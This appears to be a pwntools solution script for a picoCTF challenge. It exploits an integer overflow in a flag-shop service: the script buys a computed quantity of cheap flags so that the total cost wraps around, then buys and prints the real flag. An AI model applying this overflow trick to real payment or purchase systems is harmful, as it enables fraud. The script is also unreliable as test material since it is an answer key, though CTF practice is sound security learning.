
```python
from pwn import *

SERVER = 'jupiter.challenges.picoctf.org'
PORT = 9745
context.log_level = "info"

def exploit():
    io = remote(SERVER, PORT)
    amount = (2**31 - 1 - 1100 + 100000) // 900
    log.info(f"Buying {amount} Definitely not the flag Flags")
    io.sendlineafter(b" Enter a menu selection\n", b"2")
    io.sendlineafter(b"2. 1337 Flag\n", b"1")
    io.sendlineafter(b"These knockoff Flags cost 900 each, enter desired quantity\n", str(amount).encode('ascii'))
    log.info(f"Buying 1 1337 Flag")
    io.sendlineafter(b" Enter a menu selection\n", b"2")
    io.sendlineafter(b"2. 1337 Flag\n", b"2")
    io.sendlineafter(b"Enter 1 to buy one", b"1")
    flag = io.recvlineS().strip()
    print(flag)
    io.close()

if __name__ == "__main__":
    exploit()
```
